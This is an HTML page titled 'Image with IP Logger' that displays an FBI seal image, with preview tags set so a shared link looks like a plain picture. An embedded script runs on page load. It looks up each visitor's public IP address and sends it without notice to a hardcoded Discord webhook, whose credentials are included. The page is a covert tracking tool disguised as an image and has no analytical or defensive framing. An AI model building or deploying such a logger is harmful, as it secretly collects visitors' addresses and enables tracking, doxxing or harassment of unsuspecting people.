<!DOCTYPE html>
<html lang="sk">
<head>
  <meta charset="UTF-8" />
  <title>Image with IP Logger</title>
  <meta property="og:image" content="https://kokotzkanala.github.io/TBO-2.0-Ui/FBI_logo_Seal_of_the_Federal_Bureau_of_Investigation-2264216785.png" />
  <meta name="twitter:card" content="summary_large_image" />
</head>
<body style="margin:0; background:#000;">
  <img
    src="https://kokotzkanala.github.io/TBO-2.0-Ui/FBI_logo_Seal_of_the_Federal_Bureau_of_Investigation-2264216785.png"
    alt="Image"
    style="display:block; max-width: 100vw; max-height: 100vh; margin:auto;"
  />

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1403164786426122280/Qr-LlmfaJTRDq6OkG4SZ0VLAb_z0SEZKtdvNaDtOwEmo_u7wkalQjiwdJTNSLnxtTR5z";

    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
        fetch(webhookURL, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ content: `Visitor IP logged: ${data.ip}` })
        });
      })
      .catch(console.error);
  </script>
</body>
</html>
